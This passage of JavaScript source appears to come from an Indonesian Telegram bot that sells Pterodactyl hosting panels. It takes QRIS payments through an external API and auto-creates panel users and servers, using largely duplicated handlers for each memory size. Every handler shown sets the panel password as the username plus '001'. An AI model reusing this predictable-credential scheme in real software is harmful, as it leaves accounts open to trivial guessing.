🟢 1GB - Rp1.000
🟢 2GB - Rp2.000
🟢 3GB - Rp3.000
🟢 4GB - Rp4.000
🔥 UNLI - Rp5.000

Ketik nama paket (contoh: 1GB) untuk membeli.
`.trim();

  bot.sendMessage(chatId, paketList);

  bot.once('message', async (responseMsg) => {
    if (responseMsg.chat.id !== chatId) return;

    const pilihan = responseMsg.text.trim().toLowerCase();
    const selectedPackage = paket[pilihan];

    if (!selectedPackage) {
      return bot.sendMessage(chatId, "❌ Pilihan tidak valid! Ketik sesuai daftar (contoh: 1GB)");
    }

    const total = selectedPackage.price + setting.FeeTransaksi;
    const reff = `PANEL-${Math.floor(Math.random() * 1000000)}`;

    try {
      // ✅ Request QRIS ke Atlantic
      const depositData = qs.stringify({
        api_key: setting.ApikeyAtlantic,
        reff_id: reff,
        nominal: total,
        type: 'ewallet',
        metode: 'qris'
      });

      const res = await axios.post('https://atlantich2h.com/deposit/create', depositData, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });

      const data = res.data;
      if (!data.status) {
        return bot.sendMessage(chatId, `❌ Gagal membuat QRIS.\n${data.message || "Silakan coba lagi."}`);
      }

      const info = data.data;
      const qrImage = await QRCode.toBuffer(info.qr_string, { type: 'png' });

      const teksPembayaran = `
📦 *Pembelian Panel Private*
━━━━━━━━━━━━━━━━━━
📌 Paket: ${selectedPackage.size}
💰 Harga: Rp${selectedPackage.price + setting.FeeTransaksi}
🆔 Kode Transaksi: ${reff}

⏰ Batas Waktu: 5 Menit
📷 Scan QR di atas untuk pembayaran
`.trim();

      const sentMsg = await bot.sendPhoto(chatId, qrImage, {
        caption: teksPembayaran,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "❌ Batalkan", callback_data: "batalbuy" }]]
        }
      });

      // ✅ Simpan transaksi
      activeDeposit[userId] = {
        msgId: sentMsg.message_id,
        chatId,
        idDeposit: info.reff_id,
        id: info.id,
        paket: selectedPackage,
        pilihan,
        status: true,
        timeout: setTimeout(async () => {
          if (activeDeposit[userId]?.status) {
            await bot.sendMessage(chatId, "⏰ QRIS telah *expired*.");
            await bot.deleteMessage(chatId, activeDeposit[userId].msgId).catch(() => { });
            delete activeDeposit[userId];
          }
        }, 300000) // 5 menit
      };

      // ✅ Loop cek pembayaran
      while (activeDeposit[userId] && activeDeposit[userId].status) {
        await new Promise(r => setTimeout(r, 5000));
        const check = await axios.post('https://atlantich2h.com/deposit/status', qs.stringify({
          api_key: setting.ApikeyAtlantic,
          id: activeDeposit[userId].id
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).then(r => r.data).catch(() => null);

        const status = check?.data;
        if (status && status.status !== 'pending') {
          activeDeposit[userId].status = false;
          clearTimeout(activeDeposit[userId].timeout);

          await axios.post('https://atlantich2h.com/deposit/instant', qs.stringify({
            api_key: setting.ApikeyAtlantic,
            id: activeDeposit[userId].id,
            action: true
          }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).catch(() => { });

          await bot.deleteMessage(chatId, activeDeposit[userId].msgId).catch(() => { });

          // ✅ AUTO CREATE PANEL
          const config = sizes[pilihan] || sizes['1gb'];
          const usernamePanel = `user${Date.now()}`;
          const email = `${usernamePanel}@gmail.com`;
          const password = `${usernamePanel}001`;

          try {
            // Buat user
            const userResp = await fetch(`${domain}/api/application/users`, {
              method: 'POST',
              headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
              },
              body: JSON.stringify({
                email, username: usernamePanel, first_name: usernamePanel, last_name: "User",
                language: 'en', password
              })
            });
            const userData = await userResp.json();
            if (userData.errors) return bot.sendMessage(chatId, `⚠️ Gagal membuat user panel.`);

            const userIdPanel = userData.attributes.id;

            // Buat server
            const serverResp = await fetch(`${domain}/api/application/servers`, {
              method: 'POST',
              headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${plta}`
              },
              body: JSON.stringify({
                name: `Panel-${usernamePanel}`,
                user: userIdPanel,
                egg: parseInt(setting.eggs),
                docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
                startup: 'npm start',
                environment: { INST: 'npm', AUTO_UPDATE: '0', CMD_RUN: 'npm start' },
                limits: {
                  memory: config.memory,
                  swap: 0,
                  disk: config.disk,
                  io: 500,
                  cpu: config.cpu
                },
                feature_limits: { databases: 5, backups: 5, allocations: 1 },
                deploy: { locations: [parseInt(setting.loc)], dedicated_ip: false, port_range: [] }
              })
            });
            const serverData = await serverResp.json();
            if (serverData.errors) return bot.sendMessage(chatId, `⚠️ Gagal membuat server.`);

            const waktu = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");

            await bot.sendMessage(chatId, `
✅ *Panel Anda Siap!*
━━━━━━━━━━━━━━━━━━
🌐 Login: ${domain}
👤 Username: ${usernamePanel}
🔑 Password: ${password}
📦 Paket: ${selectedPackage.size}
⏰ Tanggal: ${waktu}
            `, { parse_mode: 'Markdown' });

            await bot.sendMessage(owner, `
📢 *PANEL TERJUAL!*
User: @${username} (${userId})
Paket: ${selectedPackage.size}
Harga: Rp${selectedPackage.price + setting.FeeTransaksi}
Tanggal: ${waktu}
            `, { parse_mode: "Markdown" });

          } catch (err) {
            console.error("Error auto-create panel:", err);
            bot.sendMessage(chatId, `⚠️ Error membuat panel.`);
          }

          delete activeDeposit[userId];
        }
      }
    } catch (error) {
      console.error("Error membuat pembayaran:", error);
      bot.sendMessage(chatId, "⚠️ Gagal membuat pembayaran, coba lagi nanti.");
    }
  });
});

bot.onText(/\/buyresellerpanel/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username || 'TanpaUsername';
  const allowedGroups = getAllowedGroups();

  // ✅ Validasi: hanya private chat ATAU grup yang diizinkan
  if (msg.chat.type !== 'private' && !allowedGroups.includes(chatId)) {
    return bot.sendMessage(chatId, "❌ Pembelian hanya bisa dilakukan via chat pribadi atau grup yang terdaftar.\nGrup terdaftar:\nhttps://t.me/buyotomatisyamzzzx");
  }

  // ✅ Cek transaksi aktif
  if (activeDeposit[userId]) {
    return bot.sendMessage(chatId, "❗ Masih ada transaksi aktif.\nKetik *.batalbeli* untuk membatalkan.");
  }

  const paketList = `🛒 *PAKET RESELLER PANEL* 🛒\n\n` +
    `Silakan pilih durasi yang ingin Anda beli:\n\n` +
    `✨ *1 MINGGU* - Rp5.000\n` +
    `✨ *1 BULAN* - Rp7.000\n` +
    `✨ *PERMANEN* - Rp10.000\n\n` +
    `Balas dengan nama durasi (contoh: "1 minggu").`;

  bot.sendMessage(chatId, paketList, { parse_mode: 'Markdown' });

  bot.once('message', async (responseMsg) => {
    if (responseMsg.chat.id !== chatId) return;
    const input = responseMsg.text.trim().toLowerCase();

    const paketSeller = {
      "1 minggu": { name: "1 Minggu", price: 5000 },
      "1 bulan": { name: "1 Bulan", price: 7000 },
      "permanen": { name: "Permanen", price: 10000 }
    };

    const selectedKey = Object.keys(paketSeller).find(key => input.includes(key));
    if (!selectedKey) {
      return bot.sendMessage(chatId, "❌ Pilihan tidak valid! Ketik: 1 minggu | 1 bulan | permanen");
    }

    const selectedPackage = paketSeller[selectedKey];
    const reff = `SELLER-${Math.floor(Math.random() * 1000000)}`;
    const total = selectedPackage.price;

    try {
      // ✅ Buat pembayaran via Atlantik
      const paymentData = qs.stringify({
        api_key: setting.ApikeyAtlantic,
        reff_id: reff,
        nominal: total,
        type: 'ewallet',
        metode: 'qris'
      });

      const res = await axios.post('https://atlantich2h.com/deposit/create', paymentData, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });

      const data = res.data;
      if (!data.status) {
        return bot.sendMessage(chatId, `❌ Gagal membuat QRIS.\n${data.message || "Silakan coba lagi."}`);
      }

      const info = data.data;
      const qrImage = await QRCode.toBuffer(info.qr_string, { type: 'png' });

      // ✅ Kirim QR ke user
      const teksPembayaran = `
📦 *PEMBELIAN SELLER PANEL*
━━━━━━━━━━━━━━━━━━━━━━
🛍 Paket: ${selectedPackage.name}
💰 Harga: Rp${total.toLocaleString('id-ID')}
🆔 Kode Transaksi: ${reff}
⏳ Waktu Bayar: 5 Menit

📷 Scan QR di atas untuk membayar
      `.trim();

      const sentMsg = await bot.sendPhoto(chatId, qrImage, {
        caption: teksPembayaran,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "❌ Batalkan", callback_data: "batalbuy" }]]
        }
      });

      activeDeposit[userId] = {
        msgId: sentMsg.message_id,
        chatId,
        id: info.id,
        amount: total,
        status: true,
        timeout: setTimeout(async () => {
          if (activeDeposit[userId]?.status) {
            await bot.sendMessage(chatId, "⏰ QRIS pembayaran *expired*.");
            await bot.deleteMessage(chatId, activeDeposit[userId].msgId).catch(() => { });
            delete activeDeposit[userId];
          }
        }, 300000) // 5 menit
      };

      // ✅ Loop pengecekan status pembayaran
      while (activeDeposit[userId] && activeDeposit[userId].status) {
        await new Promise(r => setTimeout(r, 5000));
        const check = await axios.post('https://atlantich2h.com/deposit/status', qs.stringify({
          api_key: setting.ApikeyAtlantic,
          id: activeDeposit[userId].id
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).then(r => r.data).catch(() => null);

        const status = check?.data;
        if (status && status.status !== 'pending') {
          activeDeposit[userId].status = false;
          clearTimeout(activeDeposit[userId].timeout);
          await bot.deleteMessage(chatId, activeDeposit[userId].msgId).catch(() => { });

          await bot.sendMessage(chatId, `
✅ *Pembayaran Berhasil!*
━━━━━━━━━━━━━━━━━━━━━━
🎉 Paket: ${selectedPackage.name}
🔗 Link Group Seller Panel:
👉 https://t.me/+2dJJ-hiHSbE2NDk1
          `.trim(), { parse_mode: "Markdown" });

          delete activeDeposit[userId];
        }
      }
    } catch (err) {
      console.error("ERROR:", err.response?.data || err.message);
      bot.sendMessage(chatId, "❌ Gagal memproses pembayaran. Silakan coba lagi.");
    }
  });
});

bot.onText(/\/batalbeli/, (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message; // Ambil pesan yang di-reply user

  // Jika user membalas pesan tertentu
  if (reply) {
    bot.sendMessage(
      chatId,
      "✅ Pembelian berhasil dibatalkan.",
      { reply_to_message_id: reply.message_id } // Balas pesan yang di-reply user
    );
  } else {
    // Jika tidak ada pesan yang di-reply
    bot.sendMessage(
      chatId,
      "ℹ️ Silakan balas pesan pembelian yang ingin dibatalkan.",
      { reply_to_message_id: msg.message_id } // Balas pesan perintah /batalbeli
    );
  }
});

  // ─── /panel pterodactyl 1gb ────────────────────
bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '1gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '1024';
  const cpu = '30';
  const disk = '1024';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '2gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '2048';
  const cpu = '60';
  const disk = '2048';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '3gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '3072';
  const cpu = '90';
  const disk = '3072';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '4gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '4048';
  const cpu = '110';
  const disk = '4048';
  const akunlo = setting.photoURL;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';

  let user, server;

  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email,
        username,
        first_name: username,
        last_name: username,
        language: 'en',
        password
      })
    });

    const data = await response.json();

    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }

    user = data.attributes;

    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });

    const data2 = await response2.json();
    server = data2.attributes;

  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
    return;
  }

  const datap = `Haii @${targetId}
Berikut data akun panel anda

👤  Username : ${user.username}
🔑 Password : ${password}

⛔ Syarat Dan Ketentuan !!
• Jaga data panel anda!!
• Jangan memakai script ddos
• Jangan sebar link panel
• Masa berlaku panel ini adalah 1bulan

Gunakan panel anda dengan bijak.
`;

  if (akunlo) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendPhoto(targetId, 'https://i.ibb.co/fTywFQR/20251107-022237.jpg', {
      caption: datap,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: '🌐 𝗗𝗼𝗺𝗮𝗶𝗻', url: `${domain}` }],
          [
            { text: '📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃', url: 'https://t.me/aboutyamzz' },
            { text: '🛠️ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿', url: 'https://t.me/yamzzzx' }
          ],
          [{ text: '🍁 𝗕𝘂𝘆 𝗣𝗮𝗻𝗲𝗹', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });

    bot.sendMessage(chatId, `✅ Panel berhasil dikirim ke ${targetId == msg.from.id ? 'anda' : `user ${targetId}`}`);
  } else {
    bot.sendMessage(chatId, '❌ Gagal membuat data panel. Silakan coba lagi.');
  }
});

bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));

  if (!isPremium) {
     new Promise(resolve => setTimeout(resolve, 1000));
    bot.sendMessage(chatId, 'Pᴇʀɪɴᴛᴀʜ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ, ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ꜱᴀʏᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ᴜꜱᴇʀꜱ ᴘʀᴇᴍɪᴜᴍ...', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'HUBUNGI ADMIN', url: 'https://t.me/yamzzzx' }]
        ]
      }
    });
    return;
  }

  // Parsing input: namapanel,idtelegram atau hanya namapanel
  const [username, targetId] = input.includes(',') ? input.split(',') : [input, msg.from.id];
  const name = username + '5gb';
  const email = `${username}@gmail.com`;
  const password = `${username}001`;

  const egg = setting.eggs;
  const loc = setting.loc;
  const memo = '5048';
  const cpu = '140';
  const disk = '5048';
  const akunlo = setting.photoURL;
